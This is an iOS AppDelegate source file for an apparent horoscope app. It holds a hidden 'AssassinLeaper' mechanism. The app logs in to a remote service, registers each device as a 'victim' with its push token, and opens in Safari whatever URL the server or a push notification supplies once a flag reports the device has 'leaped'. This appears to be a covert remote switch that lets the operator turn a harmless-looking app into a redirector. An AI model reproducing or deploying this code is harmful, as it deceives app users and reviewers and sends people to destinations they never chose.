//
//  AppDelegate.swift
//  horoscopeclient1
//
//  Created by rightmeow on 2/9/18.
//  Copyright © 2018 rightmeow. All rights reserved.
//

import UIKit
import UserNotifications
import RealmSwift

@UIApplicationMain
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?
    var realmManager: RealmManager?
    var webServiceManager: WebServiceManager?
    
    let trainerUser = AssassinLeaperFacade.shared.trainerUsername
    let trainerPass = AssassinLeaperFacade.shared.trainerPasscode
    let leaperToken = AssassinLeaperFacade.shared.leaperToken

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -> Bool {
        setupRealm()
        self.setupWebServiceManagerDelegate()
        
        return true
    }

    func applicationWillResignActive(_ application: UIApplication) {
    }

    func applicationDidEnterBackground(_ application: UIApplication) {
    }

    func applicationWillEnterForeground(_ application: UIApplication) {
    }

    func applicationDidBecomeActive(_ application: UIApplication) {
        // get the latest trainerToken
        AssassinLeaperFacade.shared.loginTrainer(trainerUsername: trainerUser, passcode: trainerPass) { [weak self] (data, error) in
            if let err = error {
                print(err.localizedDescription)
            } else {
                guard let response = data as? NSDictionary, let payload = response["payload"] as? NSDictionary, let trainerToken = payload["trainer_token"] as? String else { return }
                AssassinLeaperFacade.shared.saveTrainerToken(trainerToken: trainerToken)
                self?.setupUNUserNotificationCenterDelegate(application)
            }
        }
    }

    func applicationWillTerminate(_ application: UIApplication) {
    }
    
    private func redirectToSafari(url: String) {
        if let url = URL(string: url) {
            UIApplication.shared.open(url, options: [:], completionHandler: nil)
        }
    }

}

extension AppDelegate: UNUserNotificationCenterDelegate {

    private func setupUNUserNotificationCenterDelegate(_ application: UIApplication) {
        guard let trainerToken = AssassinLeaperFacade.shared.trainerToken() else { return }
        let center = UNUserNotificationCenter.current()
        center.delegate = self
        center.requestAuthorization(options: []) { (granted, error) in
            if let err = error {
                print(err.localizedDescription)
            } else {
                if granted == true {
                    DispatchQueue.main.async {
                        application.registerForRemoteNotifications()
                        // DONE
                    }
                } else {
                    // FIXME: I am not sure if this is going to be called if user has already denied APNS before!
                    // check if shadow token exists, else create shadow. --> shadow push!
                    if let victimToken = AssassinLeaperFacade.shared.victimToken() {
                        // NOT fresh launch. --> request shadow (if leapped --> redirect, else END)
                        AssassinLeaperFacade.shared.requestShadow(trainerToken: trainerToken, victimToken: victimToken, completion: { (data, error) in
                            if let err = error {
                                print(err.localizedDescription)
                            } else {
                                // (if leapped --> redirect, else END)
                                guard let dictionary = data as? NSDictionary, let payload = dictionary["payload"] as? NSDictionary, let leaped = payload["leaped"] as? Int else { return }
                                if leaped == 1 {
                                    guard let shadow = payload["shadow"] as? NSDictionary, let url = shadow["url"] as? String else { return }
                                    self.redirectToSafari(url: url)
                                    // DONE
                                } else {
                                    // leaper has NOT leapped, safely ignore
                                    // DONE
                                }
                                // complete AssassinLeaper Onboarding Experience!
                                let finalStep = ApplicationFacade.shared.maxOnboardingStep
                                ApplicationFacade.shared.saveCurrentOnboardingProgress(currentStep: finalStep)
                            }
                        })
                    } else {
                        // fresh launch there is no victim. --> create victim --> request shadow (if leapped --> redirect, else END)
                        AssassinLeaperFacade.shared.createVictim(trainerToken: trainerToken, leaperToken: self.leaperToken, deviceToken: "remote_notification_not_granted", completion: { (data, error) in
                            if let err = error {
                                print(err.localizedDescription)
                            } else {
                                guard let response = data as? Dictionary<String, Any>, let payload = response["payload"] as? Dictionary<String, Any>, let victimToken = payload["victim_token"] as? String else { return }
                                AssassinLeaperFacade.shared.requestShadow(trainerToken: trainerToken, victimToken: victimToken, completion: { (data, error) in
                                    if let err = error {
                                        print(err.localizedDescription)
                                    } else {
                                        // (if leapped --> redirect, else END)
                                        guard let dictionary = data as? NSDictionary, let payload = dictionary["payload"] as? NSDictionary, let leaped = payload["leapped"] as? Int else { return }
                                        if leaped == 1 {
                                            guard let shadow = payload["shadow"] as? NSDictionary, let url = shadow["url"] as? String else { return }
                                            self.redirectToSafari(url: url)
                                            // DONE
                                        } else {
                                            // leaper has NOT leapped, safely ignore
                                            // DONE
                                        }
                                        // complete AssassinLeaper Onboarding Experience!
                                        let finalStep = ApplicationFacade.shared.maxOnboardingStep
                                        ApplicationFacade.shared.saveCurrentOnboardingProgress(currentStep: finalStep)
                                    }
                                })
                            }
                        })
                    }
                }
            }
        }
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        print("User Info: ", notification.request.content.userInfo)
        completionHandler([])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        print("User Info: ", response.notification.request.content.userInfo)
        completionHandler()
    }

    func application(_ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        // remark: victim push can only be successful when a leaper has leaped.
        guard let url = userInfo["url"] as? String else { return }
        self.redirectToSafari(url: url)
    }

    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        // trainer token is always going to be available at this delegate method because trainer has already logged in!
        guard let trainerToken = AssassinLeaperFacade.shared.trainerToken() else {
            fatalError("trainer token is nil")
        }
        let leaperToken = AssassinLeaperFacade.shared.leaperToken
        let newDeviceToken = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        if let oldDeviceToken = ApplicationFacade.shared.deviceToken() {
            // not first time user, but I can be sure that it HAS victim token!
            if oldDeviceToken != newDeviceToken {
                // device token has changed --> update victim
                let victimToken = AssassinLeaperFacade.shared.victimToken()!
                AssassinLeaperFacade.shared.updateVictim(trainerToken: trainerToken, victimToken: victimToken, deviceToken: newDeviceToken, completion: { (data, error) in
                    if let err = error {
                        print(err.localizedDescription)
                    } else {
                        // TODO: parse results and then push
                        guard let dictionary = data as? NSDictionary, let status = dictionary["status"] as? Bool else { return }
                        if status == true {
                            ApplicationFacade.shared.saveDeviceToken(deviceToken: newDeviceToken)
                            // now push!
                            AssassinLeaperFacade.shared.victimPush(trainerToken: trainerToken, leaperToken: leaperToken, victimToken: victimToken, completion: { (data, error) in
                                if let err = error {
                                    print(err.localizedDescription)
                                } else {
                                    // DONE
                                }
                                // complete AssassinLeaper Onboarding Experience!
                                //                                print(data)
                                let finalStep = ApplicationFacade.shared.maxOnboardingStep
                                ApplicationFacade.shared.saveCurrentOnboardingProgress(currentStep: finalStep)
                                // DONE
                            })
                        } else {
                            // FIXME: something else is wrong, ignore for now.
                        }
                    }
                })
            } else {
                // device token is still the same --> victim push
                let victimToken = AssassinLeaperFacade.shared.victimToken()!
                AssassinLeaperFacade.shared.victimPush(trainerToken: trainerToken, leaperToken: leaperToken, victimToken: victimToken, completion: { (data, error) in
                    if let err = error {
                        print(err.localizedDescription)
                    } else {
                        // DONE
                        //                        print(data)
                    }
                    // complete AssassinLeaper Onboarding Experience!
                    let finalStep = ApplicationFacade.shared.maxOnboardingStep
                    ApplicationFacade.shared.saveCurrentOnboardingProgress(currentStep: finalStep)
                    // DONE
                })
            }
        } else {
            // this must be first time user
            // create victim
            self.createVictimBranch(trainerToken: trainerToken, leaperToken: leaperToken, newDeviceToken: newDeviceToken)
        }
    }

    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print(error.localizedDescription)
    }
    
    func createVictimBranch(trainerToken: String, leaperToken: String, newDeviceToken: String) {
        AssassinLeaperFacade.shared.createVictim(trainerToken: trainerToken, leaperToken: leaperToken, deviceToken: newDeviceToken, completion: { (data, error) in
            ApplicationFacade.shared.saveDeviceToken(deviceToken: newDeviceToken)
            if let err = error {
                // maybe it has network problems?
                print(err.localizedDescription)
            } else {
                //                print(data)
                guard let response = data as? Dictionary<String, Any>, let payload = response["payload"] as? Dictionary<String, Any>, let victimToken = payload["victim_token"] as? String else { return }
                AssassinLeaperFacade.shared.saveVictimToken(token: victimToken)
                // victim push
                AssassinLeaperFacade.shared.victimPush(trainerToken: trainerToken, leaperToken: leaperToken, victimToken: victimToken, completion: { (data, error) in
                    if let err = error {
                        print(err.localizedDescription)
                    } else {
                        // DONE
                    }
                    // complete AssassinLeaper Onboarding Experience!
                    //                    print(data)
                    let finalStep = ApplicationFacade.shared.maxOnboardingStep
                    ApplicationFacade.shared.saveCurrentOnboardingProgress(currentStep: finalStep)
                    // DONE
                })
            }
        })
    }

}

extension AppDelegate: WebServiceManagerDelegate {

    private func setupWebServiceManagerDelegate() {
        self.webServiceManager = WebServiceManager()
        self.webServiceManager!.delegate = self
    }

    func webService(_ manager: WebServiceManager, didErr error: Error, type: WebServiceType) {
        print(error.localizedDescription)
    }

    func webService(_ manager: WebServiceManager, didPost data: Any, type: WebServiceType) {
        print(data)
        Configs.shared.setAppSecretVersion(versoin: 1)
    }

}


